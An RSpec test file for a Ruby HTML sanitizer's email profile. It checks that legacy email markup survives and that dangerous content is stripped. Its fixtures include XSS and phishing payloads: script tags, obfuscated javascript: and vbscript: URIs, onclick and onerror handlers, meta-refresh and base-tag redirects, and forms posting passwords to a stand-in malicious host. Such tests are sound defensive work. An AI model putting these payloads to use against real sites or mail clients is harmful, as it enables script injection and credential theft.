# frozen_string_literal: true

require 'rspec'
require 'scrubber'

RSpec.describe Scrubber do
  describe 'HTML Email Profile' do
    let(:scrubber) { described_class.new(use_profiles: { html_email: true }) }

    let(:email_html) do
      <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <title>Marketing Email</title>
          <style>
            .container { width: 100%; background-color: #f0f0f0; }
            .content { padding: 20px; }
          </style>
        </head>
        <body bgcolor="#ffffff" text="#000000" link="#0000ff">
          <center>
            <table width="600" cellpadding="0" cellspacing="0" border="0">
              <tr>
                <td align="center" valign="top">
                  <font face="Arial, sans-serif" size="3" color="#333333">
                    <h1>Welcome!</h1>
                    <p>This is a <strong>marketing</strong> email.</p>
                    <a href="https://example.com" target="_blank">Click here</a>
                  </font>
                </td>
              </tr>
            </table>
          </center>
          <script>alert('xss')</script>
          <form action="/steal"><input type="text"></form>
          <iframe src="http://malicious.com"></iframe>
        </body>
        </html>
      HTML
    end

    it 'preserves document structure (html, head, body)' do
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('<html>')
      expect(clean).to include('<head>')
      expect(clean).to include('<body')
    end

    it 'preserves style tags' do
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('<style>')
      expect(clean).to include('.container { width: 100%; background-color: #f0f0f0; }')
    end

    it 'preserves legacy presentation tags (center, font)' do
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('<center>')
      expect(clean).to include('<font face="Arial, sans-serif"')
    end

    it 'preserves legacy attributes (bgcolor, width, cellpadding)' do
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('bgcolor="#ffffff"')
      expect(clean).to include('width="600"')
      expect(clean).to include('cellpadding="0"')
    end

    it 'preserves target attribute on links' do
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('target="_blank"')
    end

    it 'removes dangerous tags (script, form, iframe)' do
      clean = scrubber.sanitize(email_html)
      expect(clean).not_to include('<script>')
      expect(clean).not_to include('alert(\'xss\')')
      expect(clean).not_to include('<form')
      expect(clean).not_to include('<iframe')
    end

    it 'removes dangerous attributes' do
      email_html = '<a href="https://example.com" onclick="stealCookies()">Click me</a>'
      clean = scrubber.sanitize(email_html)
      expect(clean).to include('href="https://example.com"')
      expect(clean).not_to include('onclick')
    end

    context 'when processing sophisticated marketing email' do
      let(:marketing_html) do
        <<~HTML
          <!DOCTYPE html>
          <html>
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              #body { background-color: #f0f0f0; }
              #content-table { width: 100%; }
              .header { color: #333; }
            </style>
          </head>
          <body id="body">
            <table id="content-table">
              <tbody>
                <tr>
                  <td class="header">Special Offer</td>
                </tr>
              </tbody>
            </table>
          </body>
          </html>
        HTML
      end

      it 'preserves complex structure and styling' do
        clean = scrubber.sanitize(marketing_html)
        expect(clean).to include('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
        expect(clean).to include('#body { background-color: #f0f0f0; }')
        expect(clean).to include('#content-table { width: 100%; }')
        expect(clean).to include('<body id="body">')
        expect(clean).to include('<table id="content-table">')
      end
    end

    context 'when handling phishing and malicious attacks' do
      it 'removes meta refresh redirects' do
        phishing_html = '<html><head><meta http-equiv="refresh" content="0;url=http://malicious.com"></head><body></body></html>'
        clean = scrubber.sanitize(phishing_html)
        # http-equiv is not in the allowed attributes list for HTML_EMAIL
        expect(clean).not_to include('http-equiv')
        expect(clean).not_to include('refresh')
      end

      it 'removes obfuscated javascript URIs' do
        attacks = [
          "<a href=\"j\navascript:alert(1)\">Click</a>",
          "<a href=\"java\tscript:alert(1)\">Click</a>",
          '<a href="javascript&#58;alert(1)">Click</a>',
          '<a href="vbscript:alert(1)">Click</a>'
        ]
        attacks.each do |attack|
          clean = scrubber.sanitize(attack)
          expect(clean).not_to include('javascript:')
          expect(clean).not_to include('vbscript:')
          expect(clean).not_to include('alert(1)')
        end
      end

      it 'removes base tag hijacking' do
        # base tag is not in HTML_EMAIL tags
        phishing_html = '<html><head><base href="http://malicious.com/"></head>' \
                        '<body><a href="login">Login</a></body></html>'
        clean = scrubber.sanitize(phishing_html)
        expect(clean).not_to include('<base')
      end

      it 'removes form hijacking' do
        phishing_html = '<form action="http://malicious.com/steal"><input type="password" name="pass"></form>'
        clean = scrubber.sanitize(phishing_html)
        expect(clean).not_to include('<form')
        expect(clean).not_to include('<input')
      end
    end

    it 'removes dangerous attributes (onclick)' do
      dirty = '<a href="#" onclick="steal()">Click</a>'
      clean = scrubber.sanitize(dirty)
      expect(clean).not_to include('onclick')
    end

    it 'removes javascript: URIs' do
      dirty = '<a href="javascript:alert(1)">Click</a>'
      clean = scrubber.sanitize(dirty)
      expect(clean).not_to include('javascript:')
    end

    it 'preserves document-level language and legacy body margins' do
      dirty = <<~HTML
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style type="text/css">body { background:#f4f4f4; }</style>
        </head>
        <body bgcolor="#f4f4f4" link="398bce" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
          <table border="0" width="600" cellpadding="0" cellspacing="0" align="center">
            <tr bgcolor="#ffffff"><td>Hi</td></tr>
          </table>
        </body>
        </html>
      HTML

      clean = scrubber.sanitize(dirty)
      expect(clean).to include('<html lang="en">')
      expect(clean).to include('meta name="viewport" content="width=device-width, initial-scale=1.0"')
      expect(clean).to include('<style type="text/css">body { background:#f4f4f4; }</style>')
      expect(clean).to include('bgcolor="#f4f4f4"')
      expect(clean).to include('leftmargin="0"')
      expect(clean).to include('topmargin="0"')
      expect(clean).to include('marginwidth="0"')
      expect(clean).to include('marginheight="0"')
      expect(clean).to include('cellpadding="0"')
      expect(clean).to include('cellspacing="0"')
    end

    it 'keeps head/meta/style elements and attributes expected in email' do
      dirty = <<~HTML
        <html lang="fr">
        <head>
          <meta charset="utf-8">
          <meta name="format-detection" content="telephone=no">
          <style type="text/css">.c { color:#333; }</style>
          <title>t</title>
        </head>
        <body></body>
        </html>
      HTML

      clean = scrubber.sanitize(dirty)
      expect(clean).to include('<html lang="fr">')
      expect(clean).to include('<meta charset="utf-8">')
      expect(clean).to include('<meta name="format-detection" content="telephone=no">')
      expect(clean).to include('<style type="text/css">.c { color:#333; }</style>')
      expect(clean).to include('<title>t</title>')
    end

    it 'retains table layout attributes common to email clients' do
      dirty = <<~HTML
        <html>
        <body>
          <table width="600" border="0" cellpadding="0" cellspacing="0" align="center" bgcolor="#fff" background="bg.png" role="presentation" summary="layout">
            <tr bgcolor="#eee" background="row.png"><td bgcolor="#ddd" background="cell.png" colspan="2" rowspan="1" valign="top" align="left" width="300" height="20" headers="h" scope="col">X</td></tr>
          </table>
        </body>
        </html>
      HTML

      clean = scrubber.sanitize(dirty)
      table_expected = '<table width="600" border="0" cellpadding="0" cellspacing="0" align="center" ' \
                       'bgcolor="#fff" background="bg.png" role="presentation" summary="layout">'
      td_expected = 'td bgcolor="#ddd" background="cell.png" colspan="2" rowspan="1" valign="top" ' \
                    'align="left" width="300" height="20" headers="h" scope="col"'

      expect(clean).to include(table_expected)
      expect(clean).to include('<tr bgcolor="#eee" background="row.png">')
      expect(clean).to include(td_expected)
    end

    it 'cleans dangerous attributes while preserving allowed ones in email context' do
      dirty = <<~HTML
        <html lang="en">
        <body onclick="bad()" bgcolor="#fff">
          <a href="javascript:alert(1)" target="_blank" rel="noreferrer" onclick="steal()">Click</a>
          <img src="http://example.com/img.png" alt="" onerror="hack()" border="0" width="10" height="20">
        </body>
        </html>
      HTML

      clean = scrubber.sanitize(dirty)
      expect(clean).to include('<html lang="en">')
      expect(clean).to include('<body bgcolor="#fff">')
      expect(clean).to include('target="_blank"')
      expect(clean).to include('rel="noreferrer"')
      expect(clean).to match(%r{<img[^>]*src="http://example.com/img.png"[^>]*alt=""})
      expect(clean).not_to include('onclick="')
      expect(clean).not_to include('javascript:alert')
      expect(clean).not_to include('onerror="hack()"')
    end

    it 'applies html_email profile when configured via block with return_dom' do
      scrubber = Scrubber.new do |config|
        config.use_profiles = { html_email: true }
        config.return_dom = true
      end

      dirty = <<~HTML
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style type="text/css">body { background:#f4f4f4; }</style>
        </head>
        <body bgcolor="#f4f4f4" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
          <a href="https://example.com" target="_blank">link</a>
        </body>
        </html>
      HTML

      doc = scrubber.sanitize(dirty)
      html = doc.at('html')
      body = doc.at('body')
      expect(html['lang']).to eq('en')
      expect(doc.at('meta')['name']).to eq('viewport')
      expect(doc.at('style').text).to include('background:#f4f4f4')
      expect(body['bgcolor']).to eq('#f4f4f4')
      expect(body['leftmargin']).to eq('0')
      expect(doc.at('a')['target']).to eq('_blank')
    end
  end
end
